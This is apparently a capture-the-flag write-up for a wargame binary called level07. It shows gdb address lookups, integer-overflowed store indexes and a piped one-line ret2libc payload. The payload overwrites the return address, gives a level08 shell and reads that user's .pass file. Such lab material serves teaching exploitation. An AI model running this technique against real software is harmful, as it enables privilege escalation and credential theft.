# Level 07

## The Stack

![The stack](resources/the_stack_override07.jpg)

## The Method

- We have a way to overwrite the memory.
- Let's try to overwrite `eip`.
- No shellcode because `env` is set to 0 at beggining.

```gdb
(gdb) p/c 1073741938
$1 = 114 'r'
(gdb) p/c 1073741939
$2 = 115 's'
(gdb) p/c 1073741940
$3 = 116 't'
(gdb)

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find system, +9999999, "/bin/sh"
0xf7f897ec

1073741938 => 4159090384 (0xf7e6aed0)
1073741939 => 4159040368 (0xf7e5eb70)
116 => 4160264172 (0xf7f897ec)
```

```console
$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 1073741939
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
```

## The Hack

- Final command:

```console
$ (echo store; echo 4159090384; echo 1073741938 ; echo store; echo 4159040368; echo 1073741939 ; echo store; echo 4160264172; echo 116 ; echo quit; cat) | ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully
Input command:  Number:  Index:  Completed store command successfully

whoami
level08

cat /home/users/level08/.pass
```
